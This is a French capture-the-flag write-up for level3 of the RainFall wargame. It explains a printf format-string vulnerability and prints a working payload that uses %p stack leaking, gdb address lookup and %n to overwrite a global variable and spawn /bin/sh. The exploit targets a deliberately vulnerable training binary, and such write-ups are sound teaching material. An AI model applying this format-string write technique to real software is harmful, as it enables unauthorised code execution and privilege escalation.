# Soluce

```
(python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")'; cat) | ./level3
```

## Description du code

-   Un printf est appeler sans etre formatter
-   il y a une condition si vrai qui execute un shell

## Explication de l'exploit

On voit dans le code source qu'un printf est appelé sans formater le buffer et l'utilise directement comme argument. 
Cela va nous permettre de réaliser un exploit de formatage avec printf :

En mettant dans notre buffer des spécificateurs tels que %s, %p, %d... 
On va les faire interpréter par printf pour pouvoir afficher les éléments dans la stack au moment où l'on rentre dans printf. 
Utilisons donc une méthode de padding pour afficher à quelle position est notre chaîne :

```
level3@RainFall:~$ python -c 'print("AAAA" + " %p " * 8)' | ./level3 
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x20702520 0x20702520 0x20702520 
```

On remarque que l'adresse 0x41414141 à la quatrième place est l'équivalent de AAAA mais en hexadécimal, donc notre chaîne est à la quatrième position dans la stack.
On va utiliser deux spécificateurs de printf pour cet exploit : le premier %n qui va nous permettre de stocker le nombre de caractères qui ont été imprimés par printf jusque-là, et le %x qui,
avec une largeur, va nous permettre de compléter notre chaîne par le nombre d'éléments dont on a besoin.

Afin d'entrer dans la condition qui lance /bin/sh, on a besoin de connaître l'adresse de m. Il est possible de la récupérer avec Ghidra ou GDB :

```
level3@RainFall:~$ gdb ./level3 
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x804988c
```

Pour que m soit égal à 0x40, on doit stocker le chiffre 64 dedans car 64 = 0x40 en hexadécimal.

Donc l'adresse de M = 4 + %60x (padding)

## Payload

[Adresse de m] + [Padding de 60] + [Argument sur lequel on veut ecrire]

